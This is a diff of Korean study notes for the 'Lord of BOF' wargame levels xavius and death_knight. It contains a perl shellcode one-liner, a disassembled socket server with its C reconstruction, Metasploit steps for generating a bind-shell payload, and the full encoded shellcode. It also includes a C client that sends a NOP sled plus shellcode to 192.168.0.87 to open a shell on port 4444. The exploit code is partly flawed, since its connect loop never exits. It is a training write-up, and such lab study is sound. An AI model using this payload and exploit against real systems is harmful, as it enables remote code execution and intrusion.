@@ -1758,144 +1758,357 @@ perl로 하면 뒷자리를 01로 바꾸어 주면 됨
 (perl -e 'print  "\x90"x19. "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80".  "\x01\x50\x01\x40"';cat)|./xavius
 ```
 
+## (20) xavius / throw me away
 
-  0x80488c4  <main>:       push   %ebp   0x80488c5  <main+1>:     mov    %ebp,%esp     0x80488c7  <main+3>:     sub    %esp,84     0x80488ca  <main+6>:     push   0   0x80488cc  <main+8>:     push   1   0x80488ce  <main+10>:    push   2   0x80488d0 <main+12>:     call   0x804861c <socket>   0x80488d5  <main+17>:    add    %esp,12     0x80488d8  <main+20>:    mov    %eax,%eax   0x80488da  <main+22>:    mov    DWORD PTR [%ebp-44],%eax   0x80488dd  <main+25>:    cmp    DWORD PTR  [%ebp-44],-1   0x80488e1  <main+29>:    jne    0x8048900  <main+60>     0x80488e3  <main+31>:    push   0x8048afb   0x80488e8  <main+36>:    call   0x804853c  <perror>   0x80488ed  <main+41>:    add    %esp,4     0x80488f0  <main+44>:    push   1   0x80488f2  <main+46>:    call   0x80485dc  <exit>   0x80488f7  <main+51>:    add    %esp,4     0x80488fa  <main+54>:    lea    %esi,[%esi]   0x8048900  <main+60>:    mov    DWORD PTR  [%ebp-64],0x2   0x8048906  <main+66>:    push   0x1a0a   0x804890b  <main+71>:    call   0x80485fc  <htons>   0x8048910  <main+76>:    add    %esp,4     0x8048913  <main+79>:    mov    %eax,%eax   0x8048915  <main+81>:    mov    DWORD PTR  [%ebp-62],%ax   0x8048919 <main+85>:     mov    DWORD PTR [%ebp-60],0x0   0x8048920  <main+92>:    push   8   0x8048922  <main+94>:    lea    %eax,[%ebp-64]   0x8048925  <main+97>:    lea    %edx,[%eax+8]   0x8048928 <main+100>:    push   %edx   0x8048929  <main+101>:   call   0x80485cc <bzero>   0x804892e  <main+106>:   add    %esp,8     0x8048931  <main+109>:   push   16   0x8048933  <main+111>:   lea    %edx,[%ebp-64]   0x8048936  <main+114>:   mov    %eax,%edx   0x8048938  <main+116>:   push   %eax   0x8048939 <main+117>:    mov    %eax,DWORD PTR [%ebp-44]   0x804893c  <main+120>:   push   %eax   0x804893d <main+121>:    call   0x80485bc <bind>   0x8048942  <main+126>:   add    %esp,12     0x8048945 <main+129>:    mov    %eax,%eax   0x8048947  <main+131>:   cmp    %eax,-1   0x804894a <main+134>:    jne    0x8048963 <main+159>   0x804894c  <main+136>:   push   0x8048b02   0x8048951 <main+141>:    call   0x804853c <perror>   0x8048956  <main+146>:   add    %esp,4     0x8048959 <main+149>:    push   1   0x804895b  <main+151>:   call   0x80485dc <exit>   0x8048960 <main+156>:    add    %esp,4     0x8048963  <main+159>:   push   10   0x8048965 <main+161>:    mov    %eax,DWORD PTR [%ebp-44]   0x8048968  <main+164>:   push   %eax   0x8048969 <main+165>:    call   0x804856c <listen>   0x804896e  <main+170>:   add    %esp,8     0x8048971 <main+173>:    mov    %eax,%eax   0x8048973  <main+175>:   cmp    %eax,-1   0x8048976 <main+178>:    jne    0x8048990 <main+204>   0x8048978  <main+180>:   push   0x8048b07   0x804897d <main+185>:    call   0x804853c <perror>   0x8048982  <main+190>:   add    %esp,4     0x8048985 <main+193>:    push   1   0x8048987  <main+195>:   call   0x80485dc <exit>   0x804898c <main+200>:    add    %esp,4     0x804898f  <main+203>:   nop   0x8048990  <main+204>:   nop   0x8048991  <main+205>:   jmp    0x8048998  <main+212>   0x8048993 <main+207>:    jmp    0x8048a60 <main+412>   0x8048998  <main+212>:   mov    DWORD PTR  [%ebp-84],0x10   0x804899f <main+219>:    lea    %eax,[%ebp-84]   0x80489a2  <main+222>:   push   %eax   0x80489a3 <main+223>:    lea    %edx,[%ebp-80]   0x80489a6  <main+226>:   mov    %eax,%edx   0x80489a8  <main+228>:   push   %eax   0x80489a9  <main+229>:   mov    %eax,DWORD PTR  [%ebp-44]   0x80489ac  <main+232>:   push   %eax   0x80489ad  <main+233>:   call   0x804855c <accept>   0x80489b2  <main+238>:   add    %esp,12     0x80489b5  <main+241>:   mov    %eax,%eax   0x80489b7  <main+243>:   mov    DWORD PTR [%ebp-48],%eax   0x80489ba  <main+246>:   cmp    DWORD PTR  [%ebp-48],-1   0x80489be  <main+250>:   jne    0x80489d0  <main+268>   0x80489c0  <main+252>:   push   0x8048b0e   0x80489c5  <main+257>:   call   0x804853c <perror>   0x80489ca  <main+262>:   add    %esp,4     0x80489cd  <main+265>:   jmp    0x8048991 <main+205>   0x80489cf  <main+267>:   nop   0x80489d0  <main+268>:   call   0x804854c <fork>   0x80489d5 <main+273>:    mov    %eax,%eax   0x80489d7  <main+275>:   test   %eax,%eax   0x80489d9 <main+277>:    jne    0x8048a30 <main+364>   0x80489db  <main+279>:   push   0   0x80489dd <main+281>:    push   52   0x80489df  <main+283>:   push   0x8048b20   0x80489e4 <main+288>:    mov    %eax,DWORD PTR [%ebp-48]   0x80489e7  <main+291>:   push   %eax   0x80489e8 <main+292>:    call   0x80485ec <send>   0x80489ed  <main+297>:   add    %esp,16     0x80489f0 <main+300>:    push   0   0x80489f2  <main+302>:   push   6   0x80489f4  <main+304>:   push   0x8048b55   0x80489f9  <main+309>:   mov    %eax,DWORD PTR  [%ebp-48]   0x80489fc <main+312>:    push   %eax   0x80489fd  <main+313>:   call   0x80485ec <send>   0x8048a02 <main+318>:    add    %esp,16     0x8048a05  <main+321>:   push   0   0x8048a07  <main+323>:   push   0x100   0x8048a0c  <main+328>:   lea    %eax,[%ebp-40]   0x8048a0f  <main+331>:   push   %eax   0x8048a10 <main+332>:    mov    %eax,DWORD PTR [%ebp-48]   0x8048a13  <main+335>:   push   %eax   0x8048a14 <main+336>:    call   0x804860c <recv>   0x8048a19  <main+341>:   add    %esp,16     0x8048a1c <main+344>:    mov    %eax,DWORD PTR [%ebp-48]   0x8048a1f  <main+347>:   push   %eax   0x8048a20 <main+348>:    call   0x804852c <close>   0x8048a25  <main+353>:   add    %esp,4     0x8048a28 <main+356>:    jmp    0x8048a60 <main+412>   0x8048a2a  <main+358>:   lea    %esi,[%esi]   0x8048a30  <main+364>:   mov    %eax,DWORD PTR  [%ebp-48]   0x8048a33  <main+367>:   push   %eax   0x8048a34 <main+368>:    call   0x804852c <close>   0x8048a39  <main+373>:   add    %esp,4     0x8048a3c <main+376>:    lea    %esi,[%esi*1]   0x8048a40  <main+380>:   push   1   0x8048a42 <main+382>:    push   0   0x8048a44  <main+384>:   push   -1   0x8048a46  <main+386>:   call   0x804858c  <waitpid>   0x8048a4b  <main+391>:   add    %esp,12     0x8048a4e  <main+394>:   mov    %eax,%eax   0x8048a50  <main+396>:   test   %eax,%eax   0x8048a52 <main+398>:    jg     0x8048a56 <main+402>   0x8048a54  <main+400>:   jmp    0x8048a58  <main+404>   0x8048a56  <main+402>:   jmp    0x8048a40  <main+380>   0x8048a58  <main+404>:   jmp    0x8048991  <main+205>   0x8048a5d  <main+409>:   lea    %esi,[%esi]   0x8048a60  <main+412>:   mov    %eax,DWORD PTR  [%ebp-44]   0x8048a63  <main+415>:   push   %eax   0x8048a64  <main+416>:   call   0x804852c <close>   0x8048a69 <main+421>:    add    %esp,4     0x8048a6c  <main+424>:   leave   0x8048a6d  <main+425>:   ret	static memory 84 bytes         sock=socket(2,1,0);         if(sock==-1){   perror("socket");                   exit(1);   }       <0x1a0a=6666>   htons(6666);                   bzero();                   bind();               perror();             exit(1);           listen();               perror();           exit(1);                               accept();               perror();           fork();             send();                   send();                     recv();               close();           close();               waitpid();                         close();
-                                          	                                        
+### 문제 개요
+**assembly 코드**
+```
+0x80488c4  <main>:       push   %ebp   
+0x80488c5  <main+1>:     mov    %ebp,%esp     
 
-분석을 정확히 할 필요는 없음
+0x80488c7  <main+3>:     sub    %esp,84     
 
-일반적인 클라이언트/서버 소켓 프로그래밍 루틴과 같음.
+0x80488ca  <main+6>:     push   0   
+0x80488cc  <main+8>:     push   1   
+0x80488ce  <main+10>:    push   2   
+0x80488d0 <main+12>:     call   0x804861c <socket>   
+0x80488d5  <main+17>:    add    %esp,12     
 
-프로램을 짤 줄 아는 것이 중요.
+0x80488d8  <main+20>:    mov    %eax,%eax   
+0x80488da  <main+22>:    mov    DWORD PTR [%ebp-44],%eax   
+0x80488dd  <main+25>:    cmp    DWORD PTR  [%ebp-44],-1   
+0x80488e1  <main+29>:    jne    0x8048900  <main+60>     
 
-서버 네트워크 프로그래밍
+0x80488e3  <main+31>:    push   0x8048afb   
+0x80488e8  <main+36>:    call   0x804853c  <perror>   
+0x80488ed  <main+41>:    add    %esp,4     
 
-  client측 프로그래밍                           	server측 프로그래밍                           
-  int main(){   socket();   connet();   return  0;  }	int main(){   socket();   bind; 포트 지정   listen; 리슨 상태로 변경   accept;   return  0;  }
+0x80488f0  <main+44>:    push   1   
+0x80488f2  <main+46>:    call   0x80485dc  <exit>   
+0x80488f7  <main+51>:    add    %esp,4     
 
-c코드로 변환
+0x80488fa  <main+54>:    lea    %esi,[%esi]   
+0x8048900  <main+60>:    mov    DWORD PTR  [%ebp-64],0x2   
+0x8048906  <main+66>:    push   0x1a0a   
+0x804890b  <main+71>:    call   0x80485fc  <htons>   
+0x8048910  <main+76>:    add    %esp,4     
 
-netstat -ant 해서 보면
+0x8048913  <main+79>:    mov    %eax,%eax   
+0x8048915  <main+81>:    mov    DWORD PTR  [%ebp-62],%ax   
+0x8048919 <main+85>:     mov    DWORD PTR [%ebp-60],0x0   
+0x8048920  <main+92>:    push   8   
+0x8048922  <main+94>:    lea    %eax,[%ebp-64]   
+0x8048925  <main+97>:    lea    %edx,[%eax+8]   
+0x8048928 <main+100>:    push   %edx   
+0x8048929  <main+101>:   call   0x80485cc <bzero>   
+0x804892e  <main+106>:   add    %esp,8     
 
-6666포트 열려있음.
+0x8048931  <main+109>:   push   16   
+0x8048933  <main+111>:   lea    %edx,[%ebp-64]   
+0x8048936  <main+114>:   mov    %eax,%edx   
+0x8048938  <main+116>:   push   %eax   
+0x8048939 <main+117>:    mov    %eax,DWORD PTR [%ebp-44]   
+0x804893c  <main+120>:   push   %eax   
+0x804893d <main+121>:    call   0x80485bc <bind>   
+0x8048942  <main+126>:   add    %esp,12     
 
---------------------------------------------------------------------------
+0x8048945 <main+129>:    mov    %eax,%eax   
+0x8048947  <main+131>:   cmp    %eax,-1   
+0x804894a <main+134>:    jne    0x8048963 <main+159>   
+0x804894c  <main+136>:   push   0x8048b02   
+0x8048951 <main+141>:    call   0x804853c <perror>   
+0x8048956  <main+146>:   add    %esp,4     
 
-tcp       
+0x8048959 <main+149>:    push   1   
+0x804895b  <main+151>:   call   0x80485dc <exit>   
+0x8048960 <main+156>:    add    %esp,4     
 
-0      0
+0x8048963  <main+159>:   push   10   
+0x8048965 <main+161>:    mov    %eax,DWORD PTR [%ebp-44]   
+0x8048968  <main+164>:   push   %eax   
+0x8048969 <main+165>:    call   0x804856c <listen>   
+0x804896e  <main+170>:   add    %esp,8     
 
-0.0.0.0:6666           
+0x8048971 <main+173>:    mov    %eax,%eax   
+0x8048973  <main+175>:   cmp    %eax,-1   
+0x8048976 <main+178>:    jne    0x8048990 <main+204>   
+0x8048978  <main+180>:   push   0x8048b07   
+0x804897d <main+185>:    call   0x804853c <perror>   
+0x8048982  <main+190>:   add    %esp,4     
 
-0.0.0.0:*              
+0x8048985 <main+193>:    push   1   
+0x8048987  <main+195>:   call   0x80485dc <exit>   
+0x804898c <main+200>:    add    %esp,4     
 
-LISTEN
+0x804898f  <main+203>:   nop   
+0x8048990  <main+204>:   nop   
+0x8048991  <main+205>:   jmp    0x8048998  <main+212>   
+0x8048993 <main+207>:    jmp    0x8048a60 <main+412>   
+0x8048998  <main+212>:   mov    DWORD PTR  [%ebp-84],0x10   
+0x804899f <main+219>:    lea    %eax,[%ebp-84]   
+0x80489a2  <main+222>:   push   %eax   
+0x80489a3 <main+223>:    lea    %edx,[%ebp-80]   
+0x80489a6  <main+226>:   mov    %eax,%edx   
+0x80489a8  <main+228>:   push   %eax   
+0x80489a9  <main+229>:   mov    %eax,DWORD PTR  [%ebp-44]   
+0x80489ac  <main+232>:   push   %eax   
+0x80489ad  <main+233>:   call   0x804855c <accept>   
+0x80489b2  <main+238>:   add    %esp,12     
 
---------------------------------------------------------------------------
+0x80489b5  <main+241>:   mov    %eax,%eax   
+0x80489b7  <main+243>:   mov    DWORD PTR [%ebp-48],%eax   
+0x80489ba  <main+246>:   cmp    DWORD PTR  [%ebp-48],-1   
+0x80489be  <main+250>:   jne    0x80489d0  <main+268>   
+0x80489c0  <main+252>:   push   0x8048b0e   
+0x80489c5  <main+257>:   call   0x804853c <perror>   
+0x80489ca  <main+262>:   add    %esp,4     
 
-accept함수: 사용자가 연결요청할 때까지 블로킹되어있음.
+0x80489cd  <main+265>:   jmp    0x8048991 <main+205>   
+0x80489cf  <main+267>:   nop   
+0x80489d0  <main+268>:   call   0x804854c <fork>   
+0x80489d5 <main+273>:    mov    %eax,%eax   
+0x80489d7  <main+275>:   test   %eax,%eax   
+0x80489d9 <main+277>:    jne    0x8048a30 <main+364>   
+0x80489db  <main+279>:   push   0   
+0x80489dd <main+281>:    push   52   
+0x80489df  <main+283>:   push   0x8048b20   
+0x80489e4 <main+288>:    mov    %eax,DWORD PTR [%ebp-48]   
+0x80489e7  <main+291>:   push   %eax   
+0x80489e8 <main+292>:    call   0x80485ec <send>   
+0x80489ed  <main+297>:   add    %esp,16     
 
-CMD> telnet ip addr 6666
+0x80489f0 <main+300>:    push   0   
+0x80489f2  <main+302>:   push   6   
+0x80489f4  <main+304>:   push   0x8048b55   
+0x80489f9  <main+309>:   mov    %eax,DWORD PTR  [%ebp-48]   
+0x80489fc <main+312>:    push   %eax   
+0x80489fd  <main+313>:   call   0x80485ec <send>   
+0x8048a02 <main+318>:    add    %esp,16     
 
-지금까지 쓴 셸코드는 local에서 적용되는 것이므로
+0x8048a05  <main+321>:   push   0   
+0x8048a07  <main+323>:   push   0x100   
+0x8048a0c  <main+328>:   lea    %eax,[%ebp-40]   
+0x8048a0f  <main+331>:   push   %eax   
+0x8048a10 <main+332>:    mov    %eax,DWORD PTR [%ebp-48]   
+0x8048a13  <main+335>:   push   %eax   
+0x8048a14 <main+336>:    call   0x804860c <recv>   
+0x8048a19  <main+341>:   add    %esp,16     
 
-원격에서 적용되는 셸코드를 사용하여야 함.
+0x8048a1c <main+344>:    mov    %eax,DWORD PTR [%ebp-48]   
+0x8048a1f  <main+347>:   push   %eax   
+0x8048a20 <main+348>:    call   0x804852c <close>   
+0x8048a25  <main+353>:   add    %esp,4     
 
-*kail linux 설치
+0x8048a28 <main+356>:    jmp    0x8048a60 <main+412>   
+0x8048a2a  <main+358>:   lea    %esi,[%esi]   0
+x8048a30  <main+364>:   mov    %eax,DWORD PTR  [%ebp-48]   
+0x8048a33  <main+367>:   push   %eax   
+0x8048a34 <main+368>:    call   0x804852c <close>   
+0x8048a39  <main+373>:   add    %esp,4     
 
-http://www.kali.org/
+0x8048a3c <main+376>:    lea    %esi,[%esi*1]   
+0x8048a40  <main+380>:   push   1   
+0x8048a42 <main+382>:    push   0   
+0x8048a44  <main+384>:   push   -1   
+0x8048a46  <main+386>:   call   0x804858c  <waitpid>   
+0x8048a4b  <main+391>:   add    %esp,12     
 
--Debian 계열 리눅스
+0x8048a4e  <main+394>:   mov    %eax,%eax   
+0x8048a50  <main+396>:   test   %eax,%eax   
+0x8048a52 <main+398>:    jg     0x8048a56 <main+402>   
+0x8048a54  <main+400>:   jmp    0x8048a58  <main+404>   
+0x8048a56  <main+402>:   jmp    0x8048a40  <main+380>   
+0x8048a58  <main+404>:   jmp    0x8048991  <main+205>   
+0x8048a5d  <main+409>:   lea    %esi,[%esi]   
+0x8048a60  <main+412>:   mov    %eax,DWORD PTR  [%ebp-44]   
+0x8048a63  <main+415>:   push   %eax   
+0x8048a64  <main+416>:   call   0x804852c <close>   
+0x8048a69 <main+421>:    add    %esp,4     
 
--각종 분석도구와 공격도구/분석도구(모의해킹 도구)를 모아놓아 설치해둔 리눅스
+0x8048a6c  <main+424>:   leave   
+0x8048a6d  <main+425>:   ret
+```
 
--Download-Kali Linux 32bit ISO 설치
+**c언어로 예측하여 변환한 코드**
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <dumpcode.h>
 
--설정-시스템-프로세서-PAE/NX사용하기 체크후 설치할 것!
+main() {
+  char buffer[40];
+  int server_fd, client_fd;
+  struct sockaddr_in server_addr;
+  struct sockaddr_in client_addr;         
+  int sin_size;         
+  
+  if((server_fd = socket(2, 1, 0)) == -1){  // (socket(AF_INET, SOCK_STREAM, 0)
+    perror("socket");
+    exit(1);         
+  }         
+  
+  server_addr.sin_family = AF_INET;         
+  server_addr.sin_port = htons(6666);         server_addr.sin_addr.s_addr = INADDR_ANY;         
+  bzero(&(server_addr.sin_zero), 8);         
+  
+  if(bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1){                 
+    perror("bind");                 
+    exit(1);         
+  }         
+  
+  if(listen(server_fd, 10) == -1){                 
+    perror("listen");                 
+    exit(1);         
+  }         
+  
+  while(1) {                 
+    sin_size = sizeof(struct sockaddr_in);
+    if((client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &sin_size)) == -1){
+      perror("accept");                         
+      continue;                 
+    }                 
+    
+    if (!fork()){                         
+      send(client_fd, "Death Knight : Not even death can save you from me!\n", 52, 0);                         
+      send(client_fd, "You : ", 6, 0);                         
+      recv(client_fd, buffer, 256, 0);                         
+      close(client_fd);                         
+      break;                 
+    }                 
+    
+    close(client_fd);                 
+    while(waitpid(-1,NULL,WNOHANG) > 0);         
+  }
+  close(server_fd); 
+}
 
-      	    	    
-      	    	    
+```
 
-#> apt-cache search virtualbox
+### 문제풀이
+- netstat -ant 해서 보면 6666포트 열려있음
+- accept함수: 사용자가 연결요청할 때까지 블로킹되어있음
+- `CMD> telnet ip addr 6666`
+- 지금까지 쓴 셸코드는 local에서 적용되는 것이므로 원격에서 적용되는 셸코드를 사용하여야 함
 
-#> apt-get install virtualbox
 
-이후 게스트확장
-
-VBOXLINUX~.run을 /root/에 복사
-
-후 실행하면 설치됨.
-
-reboot.
-
-셸코드 제작에 Kali Linux를 활용.
-
-#> msfconsole
+**kail linux 설치**
+- http://www.kali.org/
+- 셸코드 제작에 Kali Linux를 활용
 
 payload==> shell code
+`#> msfconsole`
 
-#>show payloads 사용할수
+사용할수 있는 페이로드를 보여줌
+`#>show payloads` 
 
-있는 페이로드를 보여줌.
-
-bind_tcp 사용.
-
-linux/x86/shell_bind.tcp
-
-사용방법
-
-use linux/x86/shell/bind_tcp
-
-show options
+bind_tcp 사용
+`use linux/x86/shell/bind_tcp`
+`show options`
 
 포트번호 변경
+`set LPORT 1828`
 
-set LPORT 1828
+셸코드 생성
+`#> generate`
 
-#> generate //셸코드 생성
+ff와 00없는셸코드 제작
+`#> generate -b "\xff\x00"`
 
-#> generate -b "\xff\x00" //ff와 00없는셸코드 제작
+#### 사용할 셸코드
+```
+# linux/x86/shell_bind_tcp - 105 bytes 
+# http://www.metasploit.com 
+# Encoder: x86/shikata_ga_nai 
+# VERBOSE=false, LPORT=4444, RHOST=, PrependFork=false, 
+# PrependSetresuid=false, PrependSetreuid=false, 
+# PrependSetuid=false, PrependSetresgid=false, 
+# PrependSetregid=false, PrependSetgid=false, 
+# PrependChrootBreak=false, AppendExit=false, 
+# InitialAutoRunScript=, AutoRunScript= 
+buf = 
+"\xda\xdb\xbf\x17\x3c\xdf\x0a\xd9\x74\x24\xf4\x5e\x33\xc9" + 
+"\xb1\x14\x83\xc6\x04\x31\x7e\x15\x03\x7e\x15\xf5\xc9\xee" + 
+"\xd1\x0e\xd2\x42\xa5\xa3\x7f\x67\xa0\xa2\x30\x01\x7f\xa4" + 
+"\x6a\x90\x2d\xcc\x8e\x2c\xc3\x50\xe5\x3c\xb2\x38\x70\xdd" + 
+"\x5e\xde\xda\xd3\x1f\x97\x9a\xef\xac\xa3\xac\x96\x1f\x2b" + 
+"\x8f\xe6\xc6\xe6\x90\x94\x5e\x92\xaf\xc2\xad\xe2\x99\x8b" + 
+"\xd5\x8a\x36\x43\x55\x22\x21\xb4\xfb\xdb\xdf\x43\x18\x4b" + 
+"\x73\xdd\x3e\xdb\x78\x10\x40"
+```
 
-<사용할 셸코드>
+#### c언어 소켓 프로그래밍
+```
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
 
-<소켓 프로그래밍>
+char shell[]= "\xda\xdb\xbf\x17\x3c\xdf\x0a\xd9\x74\x24\xf4\x5e\x33\xc9" 
+"\xb1\x14\x83\xc6\x04\x31\x7e\x15\x03\x7e\x15\xf5\xc9\xee" "\xd1\x0e\xd2\x42\xa5\xa3\x7f\x67\xa0\xa2\x30\x01\x7f\xa4" "\x6a\x90\x2d\xcc\x8e\x2c\xc3\x50\xe5\x3c\xb2\x38\x70\xdd" "\x5e\xde\xda\xd3\x1f\x97\x9a\xef\xac\xa3\xac\x96\x1f\x2b" "\x8f\xe6\xc6\xe6\x90\x94\x5e\x92\xaf\xc2\xad\xe2\x99\x8b" "\xd5\x8a\x36\x43\x55\x22\x21\xb4\xfb\xdb\xdf\x43\x18\x4b" "\x73\xdd\x3e\xdb\x78\x10\x40";
+
+int main(){  
+  int sock=0; 
+  struct sockaddr_in addr; 
+  int ret=0xbfffffff;
+  unsigned int num1=0; 
+  unsigned int num2=0; 
+  unsigned int num3=0; 
+  unsigned int num4=0; 
+  unsigned int sum=0; 
+  char data[256]={0,}; 
+  
+  addr.sin_family=PF_INET; 
+  addr.sin_port=htons(6666); 
+  addr.sin_addr.s_addr=inet_addr("192.168.0.87"); 
+  bzero( &(addr.sin_zero),8);
+  
+  memset(data,0x90,256);
+  memcpy(data+100,shell,sizeof(shell));
+  
+  while(1){
+    sock=socket(PF_INET, SOCK_STREAM, 0);
+    connect(sock, (struct sockaddr *)&addr, sizeof(addr));
+  }
+  memcpy(data+44,&ret,4);
+  send(sock,&data,sizeof(data),0); 
+  close(sock);
+  return 0; 
+}
+```
 
-xavius ip: 192.168.0.87
+### 문제풀이
+- xavius ip: 192.168.0.87
+- ebp-44 ~ ebp-40+256 만큼 사용 가능
+- RET주소는 gdb로 확인할 방법이 없으므로 브루트포싱해야함
+- send할 client network programming 필요
+- bof 네트워크 설정
+  + NAT ->Bridge로 변경
+  + Configure Adapters - VirtualBox Host-Only EthernetAdapter 체크 해제
+- inet_addr: BOF ip(VMware)
+- 192.168.0.87에 256바이트 전송
 
-ebp-44~ebp-40+256만큼
-
-사용 가능.
-
-RET주소는 gdb로 확인할 방법이 없으므로 브루트포싱해야함.
-
-send할 client network programming 필요.
-
-bof 네트워크 설정: NAT ->Bridge로 변경. 
-
-Configure Adapters - VirtualBox Host-Only EthernetAdapter 체크 해제.
-
-inet_addr: BOF ip(VMware)
-
-192.168.0.87(옆자리)에
-
-256바이트 전송
-
-셸코드 구성내용
-
+#### 셸코드 구성내용
+```
 nop x 44 [ SHELL CODE 105bytes]
-
 프로그램 작성: Cent OS
-
-연결되어있는지 여부는 4444번 포트로 tcp연결을 해 보면 알 수 있음.
+연결되어있는지 여부는 4444번 포트로 tcp연결을 해 보면 알 수 있음
 
 CMD> telnet 192.168 0.87 4444
-
 id;
-
-my-pass;     //세미콜론을 붙여야제대로 전달됨.
+my-pass;     //세미콜론을 붙여야제대로 전달됨
 
 결과: id: death_knight // got the life
+```
 
+![images/death-knight.png](images/death-knight.png)
 
-
-
+FINISH!
